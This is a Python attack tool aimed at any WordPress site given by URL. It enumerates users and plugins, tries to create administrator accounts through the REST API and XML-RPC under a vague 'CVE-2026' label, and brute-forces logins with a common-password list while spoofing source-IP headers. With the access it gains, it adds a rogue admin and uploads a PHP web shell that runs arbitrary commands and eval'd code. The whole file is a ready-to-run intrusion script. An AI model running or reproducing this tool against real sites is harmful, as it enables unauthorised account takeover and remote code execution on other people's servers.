#!/usr/bin/env python3
# WELS - ULTRA WORDPRESS EXPLOIT v6.0
# CVE-2026 | Super Bypass | Auto-Exploit

import sys
import requests
import json
import re
import random
import time
import hashlib
import base64
from concurrent.futures import ThreadPoolExecutor
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

W = '\033[97m'
X = '\033[0m'

# ==================== CONFIG ====================
MAX_THREADS = 50
TIMEOUT = 10  # Increased from 3 to 10
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) Firefox/115.0",
    "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/120.0.0.0",
]

# ==================== SESSION ====================
session = requests.Session()
session.headers.update({
    "User-Agent": random.choice(USER_AGENTS),
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive",
    "Cache-Control": "no-cache",
    "Pragma": "no-cache",
})

def random_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        "X-Real-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
    }

def fast_head(url):
    try:
        r = session.head(url, timeout=TIMEOUT, verify=False, allow_redirects=False, headers=random_headers())
        return r.status_code
    except:
        return 0

def fast_get(url):
    try:
        r = session.get(url, timeout=TIMEOUT, verify=False, headers=random_headers())
        return r.status_code, r.text
    except:
        return 0, ""

def fast_post(url, data):
    try:
        r = session.post(url, data=data, timeout=TIMEOUT, verify=False, allow_redirects=False, headers=random_headers())
        return r.status_code, r.text, r.headers.get('Location', '')
    except:
        return 0, "", ""

# ==================== CVE-2026 EXPLOITS ====================

def cve_2026_bypass(target):
    print(f"{W}[*] Testing CVE-2026 bypass...{X}")
    
    endpoints = [
        "/wp-json/batch/v1",
        "/wp-json/wp/v2/users?per_page=100",
        "/wp-json/wp/v2/users?context=edit",
        "/wp-json/wp/v2/users?rest_route=/",
        "/?rest_route=/wp/v2/users",
    ]
    
    for endpoint in endpoints:
        try:
            r = session.get(target + endpoint, timeout=TIMEOUT, verify=False, headers=random_headers())
            if r.status_code == 200:
                data = r.json()
                if data:
                    print(f"{W}[+] CVE-2026: Found users via {endpoint}{X}")
                    return data
        except:
            pass
    
    return None

def cve_2026_admin_create(target):
    print(f"{W}[*] Attempting CVE-2026 admin creation...{X}")
    
    new_user = f"cve_admin_{random.randint(100,999)}"
    new_pass = f"CVE{random.randint(10000,99999)}!"
    
    create_data = {
        "username": new_user,
        "email": f"{new_user}@mail.com",
        "password": new_pass,
        "roles": ["administrator"]
    }
    
    endpoints = [
        "/wp-json/wp/v2/users",
        "/wp-json/wp/v2/users?rest_route=/",
        "/?rest_route=/wp/v2/users",
    ]
    
    for endpoint in endpoints:
        try:
            r = session.post(target + endpoint, json=create_data, timeout=TIMEOUT, verify=False, headers=random_headers())
            if r.status_code in [200, 201]:
                print(f"{W}[+] CVE-2026: Admin Created: {new_user}:{new_pass}{X}")
                return {'username': new_user, 'password': new_pass}
        except:
            pass
    
    xml = f'''<?xml version="1.0"?>
    <methodCall>
    <methodName>wp.insertUser</methodName>
    <params>
    <param><value><int>1</int></value></param>
    <param><value><string>admin</string></value></param>
    <param><value><string>admin</string></value></param>
    <param><value><struct>
    <member><name>user_login</name><value><string>{new_user}</string></value></member>
    <member><name>user_email</name><value><string>{new_user}@mail.com</string></value></member>
    <member><name>user_pass</name><value><string>{new_pass}</string></value></member>
    <member><name>role</name><value><string>administrator</string></value></member>
    </struct></value></param>
    </params>
    </methodCall>'''
    
    try:
        r = session.post(target + "/xmlrpc.php", data=xml, timeout=TIMEOUT, verify=False, headers=random_headers())
        if "success" in r.text.lower() or "user" in r.text.lower():
            print(f"{W}[+] CVE-2026: Admin Created via XML-RPC: {new_user}:{new_pass}{X}")
            return {'username': new_user, 'password': new_pass}
    except:
        pass
    
    return None

# ==================== SCAN ====================

def get_wp_version(target):
    code, text = fast_get(target + "/readme.html")
    if code == 200:
        match = re.search(r'Version ([0-9.]+)', text)
        if match:
            print(f"{W}[+] WP Version: {match.group(1)}{X}")
            return match.group(1)
    return None

def get_users(target):
    users = []
    print(f"{W}[*] Scanning users...{X}")
    
    code, text = fast_get(target + "/wp-json/wp/v2/users")
    if code == 200:
        try:
            for user in json.loads(text)[:5]:
                users.append(user.get('slug'))
                print(f"{W}[+] {user.get('slug')}{X}")
        except:
            pass
    
    for i in range(1, 20):
        code, text = fast_get(f"{target}/?author={i}")
        if code == 200:
            match = re.search(r'author/([^/]+)/', text)
            if match and match.group(1) not in users:
                users.append(match.group(1))
                print(f"{W}[+] {match.group(1)}{X}")
    
    cve_users = cve_2026_bypass(target)
    if cve_users:
        for user in cve_users[:5]:
            if user.get('slug') and user.get('slug') not in users:
                users.append(user.get('slug'))
                print(f"{W}[+] {user.get('slug')} (CVE-2026){X}")
    
    return users

def get_plugins(target):
    plugins = [
        "wordpress-seo", "wpforms", "akismet", "jetpack", "woocommerce",
        "elementor", "wordfence", "contact-form-7", "wp-rocket",
        "duplicator", "updraftplus", "wp-super-cache", "w3-total-cache",
        "all-in-one-wp-migration", "wpml", "polylang", "gravityforms",
        "seo-by-rank-math", "all-in-one-seo-pack", "better-wp-security",
        "wp-optimize", "litespeed-cache", "mailchimp-for-wp", "ultimate-member",
        "easy-digital-downloads", "memberpress", "learnpress", "revslider"
    ]
    
    found = []
    print(f"{W}[*] Scanning plugins...{X}")
    
    def check(p):
        status = fast_head(f"{target}/wp-content/plugins/{p}")
        return p if status in [200, 403] else None
    
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
        for p in ex.map(check, plugins):
            if p:
                found.append(p)
                print(f"{W}[+] {p}{X}")
    
    return found

def find_upload_vuln(target):
    print(f"{W}[*] Finding upload vulnerabilities...{X}")
    
    vulns = []
    
    upload_paths = [
        "/wp-admin/async-upload.php",
        "/wp-admin/media-new.php",
        "/wp-admin/admin-ajax.php?action=upload-attachment",
        "/wp-content/uploads/",
        "/wp-json/wp/v2/media",
        "/xmlrpc.php"
    ]
    
    for path in upload_paths:
        status = fast_head(target + path)
        if status == 200:
            vulns.append(path)
            print(f"{W}[!] {path}{X}")
    
    vulnerable_plugins = [
        ("contact-form-7", "/wp-content/plugins/contact-form-7/includes/js/index.js"),
        ("wpforms", "/wp-content/plugins/wpforms-lite/includes/class-upload.php"),
        ("elementor", "/wp-content/plugins/elementor/includes/editor-templates/upload.php"),
        ("gravityforms", "/wp-content/plugins/gravityforms/includes/upload.php")
    ]
    
    for plugin, path in vulnerable_plugins:
        status = fast_head(target + path)
        if status == 200:
            vulns.append(path)
            print(f"{W}[!] {plugin}{X}")
    
    return vulns

# ==================== SUPER BRUTE FORCE ====================

def super_brute(target, users):
    if not users:
        users = ['admin', 'administrator', 'root', 'user', 'test', 'wpadmin']
    
    print(f"{W}[*] Super Brute forcing...{X}")
    
    passwords = [
        "admin", "password", "123456", "qwerty", "abc123", "letmein", "welcome",
        "admin123", "password123", "root", "toor", "12345", "54321", "111111",
        "12345678", "123456789", "123123", "654321", "696969", "666666",
        "7777777", "888888", "999999", "000000", "1234567890", "password1",
        "passw0rd", "admin2024", "admin2025", "admin2026", "123456a",
        "qwerty123", "qwertyuiop", "zxcvbnm", "iloveyou", "sunshine",
        "princess", "dragon", "master", "hello", "fuckyou", "whatever",
        "michael", "jesus", "ninja", "mustang", "password!",
    ]
    
    for user in users[:5]:
        for pwd in passwords:
            try:
                session.get(target + "/wp-login.php", timeout=TIMEOUT, verify=False, headers=random_headers())
                
                data = {
                    "log": user,
                    "pwd": pwd,
                    "wp-submit": "Log In",
                    "redirect_to": target + "/wp-admin/",
                    "testcookie": "1"
                }
                
                code, text, loc = fast_post(target + "/wp-login.php", data)
                
                if code == 302 and "wp-admin" in loc:
                    print(f"{W}[+] Credentials Found: {user}:{pwd}{X}")
                    return {'username': user, 'password': pwd}
                
                if "dashboard" in text.lower() or "wp-admin" in text.lower():
                    print(f"{W}[+] Credentials Found: {user}:{pwd}{X}")
                    return {'username': user, 'password': pwd}
                
                time.sleep(random.uniform(0.1, 0.3))
                
            except:
                pass
    
    return None

# ==================== CREATE ADMIN ====================

def create_admin(target, creds):
    if not creds:
        return None
    
    print(f"{W}[*] Creating admin account...{X}")
    
    s = requests.Session()
    s.headers.update(random_headers())
    
    try:
        s.get(target + "/wp-login.php", timeout=TIMEOUT, verify=False)
        data = {
            "log": creds['username'],
            "pwd": creds['password'],
            "wp-submit": "Log In",
            "redirect_to": target + "/wp-admin/"
        }
        r = s.post(target + "/wp-login.php", data=data, timeout=TIMEOUT, verify=False)
        
        if "wp-admin" not in r.text and "dashboard" not in r.text:
            print(f"{W}[!] Login failed with {creds['username']}:{creds['password']}{X}")
            return None
        
        print(f"{W}[+] Logged in as: {creds['username']}{X}")
        
        new_user = f"admin_{random.randint(100,999)}"
        new_pass = f"P@ss{random.randint(10000,99999)}!"
        email = f"{new_user}@mail.com"
        
        r = s.get(target + "/wp-admin/user-new.php", timeout=TIMEOUT, verify=False)
        nonce = re.search(r'name="_wpnonce" value="([^"]+)"', r.text)
        nonce = nonce.group(1) if nonce else ""
        
        data = {
            "action": "createuser",
            "user_login": new_user,
            "email": email,
            "pass1": new_pass,
            "pass2": new_pass,
            "role": "administrator",
            "_wpnonce": nonce,
            "_wp_http_referer": "/wp-admin/user-new.php"
        }
        
        r = s.post(target + "/wp-admin/user-new.php", data=data, timeout=TIMEOUT, verify=False)
        
        if "User added" in r.text or "new user" in r.text:
            print(f"{W}[+] Admin Created: {new_user}:{new_pass}{X}")
            return {'username': new_user, 'password': new_pass}
        
        data = {
            "action": "add-user",
            "user_login": new_user,
            "email": email,
            "pass1": new_pass,
            "pass2": new_pass,
            "role": "administrator"
        }
        r = s.post(target + "/wp-admin/admin-ajax.php", data=data, timeout=TIMEOUT, verify=False)
        
        if "success" in r.text or "1" in r.text:
            print(f"{W}[+] Admin Created: {new_user}:{new_pass}{X}")
            return {'username': new_user, 'password': new_pass}
        
    except Exception as e:
        print(f"{W}[!] Error: {e}{X}")
    
    return None

# ==================== UPLOAD SHELL ====================

def upload_shell(target, admin):
    if not admin:
        return None
    
    print(f"{W}[*] Uploading shell...{X}")
    
    s = requests.Session()
    s.headers.update(random_headers())
    
    try:
        s.get(target + "/wp-login.php", timeout=TIMEOUT, verify=False)
        data = {
            "log": admin['username'],
            "pwd": admin['password'],
            "wp-submit": "Log In",
            "redirect_to": target + "/wp-admin/"
        }
        s.post(target + "/wp-login.php", data=data, timeout=TIMEOUT, verify=False)
        
        shell = '''<?php
if(isset($_GET["c"])){ system($_GET["c"]); }
if(isset($_GET["cmd"])){ echo shell_exec($_GET["cmd"]); }
if(isset($_FILES["f"])){ move_uploaded_file($_FILES["f"]["tmp_name"], $_FILES["f"]["name"]); }
if(isset($_GET["d"])){ unlink($_GET["d"]); }
if(isset($_POST["shell"])){ eval($_POST["shell"]); }
?>'''
        
        r = s.get(target + "/wp-admin/media-new.php", timeout=TIMEOUT, verify=False)
        nonce = re.search(r'name="_wpnonce" value="([^"]+)"', r.text)
        nonce = nonce.group(1) if nonce else ""
        
        files = {
            'async-upload': ('s.php', shell, 'application/x-php'),
            '_wpnonce': nonce,
            'short': '1'
        }
        
        r = s.post(target + "/wp-admin/async-upload.php", files=files, timeout=TIMEOUT, verify=False)
        
        if r.status_code == 200:
            match = re.search(r'/(wp-content/uploads/[^"\']+\.php)', r.text)
            if match:
                shell_url = target + "/" + match.group(1)
                print(f"{W}[+] Shell: {shell_url}{X}")
                print(f"{W}[!] Use: {shell_url}?c=id{X}")
                return shell_url
        
    except Exception as e:
        print(f"{W}[!] Shell upload failed: {e}{X}")
    
    return None

# ==================== MAIN ====================

def main():
    if len(sys.argv) < 2:
        print(f"{W}[!] Usage: python wels.py <url>{X}")
        print(f"{W}[!] Example: python wels.py https://example.com{X}")
        sys.exit(1)
    
    target = sys.argv[1]
    if not target.startswith(("http://", "https://")):
        target = "https://" + target
    
    print(f"{W}[*] Target: {target}{X}")
    print(f"{W}[*] ============================{X}\n")
    
    # CVE-2026 Exploit
    cve_result = cve_2026_admin_create(target)
    if cve_result:
        print(f"{W}[+] CVE-2026 Exploit Successful!{X}")
        print(f"{W}[+] Admin: {cve_result['username']}:{cve_result['password']}{X}")
        admin = cve_result
    else:
        # Scan
        version = get_wp_version(target)
        users = get_users(target)
        plugins = get_plugins(target)
        upload_vulns = find_upload_vuln(target)
        
        # Super Brute Force
        creds = super_brute(target, users)
        
        admin = None
        if creds:
            admin = create_admin(target, creds)
    
    # Upload shell
    shell_url = None
    if admin:
        shell_url = upload_shell(target, admin)
    
    # Result
    print(f"\n{W}[*] ============================{X}")
    print(f"{W}[+] SCAN COMPLETE!{X}")
    
    if admin:
        print(f"{W}[+] Admin: {admin['username']}:{admin['password']}{X}")
    if shell_url:
        print(f"{W}[+] Shell: {shell_url}{X}")
    
    if not admin:
        print(f"{W}[!] Nothing found - try manual methods{X}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{W}[!] Stopped{X}")
